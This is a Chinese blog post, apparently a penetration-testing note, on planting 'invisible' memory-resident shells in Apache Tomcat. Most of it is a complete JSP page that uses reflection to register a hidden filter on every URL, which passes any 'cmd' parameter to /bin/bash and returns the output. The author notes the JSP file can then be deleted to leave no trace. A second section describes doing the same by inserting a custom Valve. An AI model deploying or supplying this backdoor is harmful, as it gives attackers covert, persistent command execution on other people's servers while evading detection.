{"title":"免杀与免检测shell网页后门脚本","slug":"网安大类/PenetrationNote/持续维权/Backdoor/网站后门/免杀与免检测shell网页后门脚本","date":"2019-08-28T10:36:30.000Z","updated":"2023-01-31T02:29:10.674Z","url":"2019/8-28-403.html","path":"api/articles/2019/8-28-403.html.json","covers":["https://img.weiyigeek.top/2019/1/20190916160414.png"],"content":"<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"Tomcat源代码调试看不见的-Shell\"><a href=\"#Tomcat源代码调试看不见的-Shell\" class=\"headerlink\" title=\"Tomcat源代码调试看不见的 Shell\"></a>Tomcat源代码调试看不见的 Shell</h4><p>描述: 调试了 tomcat 从接收到一个socket, 到解析socket 并封装成Request 转发至 Jsp/Servlet 的全过程</p>\n<p><strong>Step1.运行时动态插入过滤器</strong><br>描述:需要了解过滤器的基础概念以及作用, Servlet 规范（应该是从3.0 开始）里面本身规定了一个名为ServletContext 的接口，其中有三个重载方法：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#三个方法使得我们可以在运行时动态地添加过滤器。</span><br><span class=\"line\">FilterRegistration.<span class=\"function\">Dynamic <span class=\"title\">addFilter</span><span class=\"params\">(String filterName,String className)</span></span></span><br><span class=\"line\"><span class=\"function\">FilterRegistration.Dynamic <span class=\"title\">addFilter</span><span class=\"params\">(String filterName,Filter filter)</span></span></span><br><span class=\"line\"><span class=\"function\">FilterRegistration.Dynamic <span class=\"title\">addFilter</span><span class=\"params\">(String filterName,Class&lt;? extends Filter&gt; filterClass)</span></span></span><br></pre></td></tr></table></figure></p>\n<p>Tomcat 对 ServletContext 接口的实现类为：<code>org.apache.catalina.core.ApplicationContextFacade</code>，<code>真正的组装方法位于org.apache.catalina.core.ApplicationFilterFactory#createFilterChain</code>,组装完成后开始调用过滤器链</p>\n<p>因为 Tomcat 在对这个接口的实现中，是只允许在容器还没有初始化完成的时候调用这几个方法。<br>一旦容器初始化已经结束，调用时就会出现异常：<br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190916160414.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>shell示例:<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page language=<span class=\"string\">\"java\"</span> contentType=<span class=\"string\">\"text/html; charset=UTF-8\"</span></span><br><span class=\"line\">    pageEncoding=<span class=\"string\">\"UTF-8\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"java.io.IOException\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"javax.servlet.DispatcherType\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"javax.servlet.Filter\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"javax.servlet.FilterChain\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"javax.servlet.FilterConfig\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"javax.servlet.FilterRegistration\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"javax.servlet.ServletContext\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"javax.servlet.ServletException\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"javax.servlet.ServletRequest\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"javax.servlet.ServletResponse\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"javax.servlet.annotation.WebServlet\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"javax.servlet.http.HttpServlet\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"javax.servlet.http.HttpServletRequest\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"javax.servlet.http.HttpServletResponse\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"org.apache.catalina.core.ApplicationContext\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"org.apache.catalina.core.ApplicationFilterConfig\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"org.apache.catalina.core.StandardContext\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"org.apache.tomcat.util.descriptor.web.*\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"org.apache.catalina.Context\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"java.lang.reflect.*\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"java.util.EnumSet\"</span>%&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"java.util.Map\"</span>%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html PUBLIC <span class=\"string\">\"-//W3C//DTD HTML 4.01 Transitional//EN\"</span> <span class=\"string\">\"http://www.w3.org/TR/html4/loose.dtd\"</span>&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta http-equiv=<span class=\"string\">\"Content-Type\"</span> content=<span class=\"string\">\"text/html; charset=UTF-8\"</span>&gt;</span><br><span class=\"line\">&lt;title&gt;Insert title here&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\"><span class=\"keyword\">final</span> String name = <span class=\"string\">\"WeiyiGeel\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">ServletContext ctx = request.getSession().getServletContext();</span><br><span class=\"line\">Field f = ctx.getClass().getDeclaredField(<span class=\"string\">\"context\"</span>);</span><br><span class=\"line\">f.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">ApplicationContext appCtx = (ApplicationContext)f.get(ctx);</span><br><span class=\"line\"></span><br><span class=\"line\">f = appCtx.getClass().getDeclaredField(<span class=\"string\">\"context\"</span>);</span><br><span class=\"line\">f.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">StandardContext standardCtx = (StandardContext)f.get(appCtx);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">f = standardCtx.getClass().getDeclaredField(<span class=\"string\">\"filterConfigs\"</span>);</span><br><span class=\"line\">f.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">Map filterConfigs = (Map)f.get(standardCtx);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (filterConfigs.get(name) == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">   out.println(<span class=\"string\">\"inject \"</span>+ name);</span><br><span class=\"line\">   </span><br><span class=\"line\">   Filter filter = <span class=\"keyword\">new</span> Filter() &#123;</span><br><span class=\"line\">      <span class=\"meta\">@Override</span></span><br><span class=\"line\">      <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">(FilterConfig arg0)</span> <span class=\"keyword\">throws</span> ServletException </span>&#123;</span><br><span class=\"line\">         <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      </span><br><span class=\"line\">      <span class=\"meta\">@Override</span></span><br><span class=\"line\">      <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">doFilter</span><span class=\"params\">(ServletRequest arg0, ServletResponse arg1, FilterChain arg2)</span></span></span><br><span class=\"line\"><span class=\"function\">            <span class=\"keyword\">throws</span> IOException, ServletException </span>&#123;</span><br><span class=\"line\">         <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">         HttpServletRequest req = (HttpServletRequest)arg0;</span><br><span class=\"line\">         <span class=\"keyword\">if</span> (req.getParameter(<span class=\"string\">\"cmd\"</span>) != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">byte</span>[] data = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">1024</span>];</span><br><span class=\"line\">            Process p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"string\">\"/bin/bash\"</span>,<span class=\"string\">\"-c\"</span>, req.getParameter(<span class=\"string\">\"cmd\"</span>)).start();</span><br><span class=\"line\">            <span class=\"keyword\">int</span> len = p.getInputStream().read(data);</span><br><span class=\"line\">            p.destroy();</span><br><span class=\"line\">            arg1.getWriter().write(<span class=\"keyword\">new</span> String(data, <span class=\"number\">0</span>, len));</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">         &#125; </span><br><span class=\"line\">         arg2.doFilter(arg0, arg1);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      </span><br><span class=\"line\">      <span class=\"meta\">@Override</span></span><br><span class=\"line\">      <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">destroy</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">         <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">   &#125;;</span><br><span class=\"line\">   </span><br><span class=\"line\">   FilterDef filterDef = <span class=\"keyword\">new</span> FilterDef();</span><br><span class=\"line\">    filterDef.setFilterName(name);</span><br><span class=\"line\">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class=\"line\">    filterDef.setFilter(filter);</span><br><span class=\"line\">    </span><br><span class=\"line\">    standardCtx.addFilterDef(filterDef);</span><br><span class=\"line\">   </span><br><span class=\"line\">   FilterMap m = <span class=\"keyword\">new</span> FilterMap();</span><br><span class=\"line\">   m.setFilterName(filterDef.getFilterName());</span><br><span class=\"line\">   m.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class=\"line\">   m.addURLPattern(<span class=\"string\">\"/*\"</span>);</span><br><span class=\"line\">   </span><br><span class=\"line\">   </span><br><span class=\"line\">   standardCtx.addFilterMapBefore(m);</span><br><span class=\"line\">   </span><br><span class=\"line\">   </span><br><span class=\"line\">   Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class=\"line\">   constructor.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">   FilterConfig filterConfig = (FilterConfig)constructor.newInstance(standardCtx, filterDef);</span><br><span class=\"line\">   </span><br><span class=\"line\">   </span><br><span class=\"line\">    filterConfigs.put(name, filterConfig);</span><br><span class=\"line\">    </span><br><span class=\"line\">    out.println(<span class=\"string\">\"injected\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br>访问后如果看到 injected 字样，说明我们的过滤器已经插入成功，随后可以将此 jsp 文件删掉。随后任何带有 cmd 参数的请求都会被此过滤器拦下来，并执行 shell 命令，达到“看不见的 shell”的效果。</p>\n<p><br></p>\n<p><strong>Step2.动态插入 Valve</strong><br>Valve 是 Tomcat 中的用于对Container 组件（Engine/Host/Context/Wrapper）进行扩展一种机制。<br>Tomcat 中 Container 类型的组件之间的上下级调用基本上都是通过pipeline 与 valve 完成的, 通常是多个Valve组装在一起放在Pipeline 里面;</p>\n<ul>\n<li>Pipeline 就相当于拦截器链</li>\n<li>valve就相当于拦截器</li>\n</ul>\n<p>Valve 接口定义了如下的 invoke 方法：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">publicvoid <span class=\"title\">invoke</span><span class=\"params\">(Request request, Response response)</span></span></span><br><span class=\"line\"><span class=\"function\">    <span class=\"keyword\">throws</span> IOException, ServletException</span>;</span><br></pre></td></tr></table></figure></p>\n<p>我们只需在运行时向 Engine/Host/Context/Wrapper  这四种 Container 组件中的任意一个的pipeline 中插入一个我们自定义的 valve，在其中对相应的请求进行拦截并执行我们想要的功能，就可以达到与上面Filter 的方式一样的效果。</p>\n<p>两种方式相同点:</p>\n<ul>\n<li>利用的时候都必须是通过 HTTP 的方式去真正地发起一个请求;</li>\n<li>两种方式都会在 Tomcat 重启后失效</li>\n</ul>\n","comments":true,"excerpt":"[TOC]","categories":[{"name":"Backdoor","path":"api/categories/Backdoor.json"}],"tags":[{"name":"shell连接","path":"api/tags/shell连接.json"}]}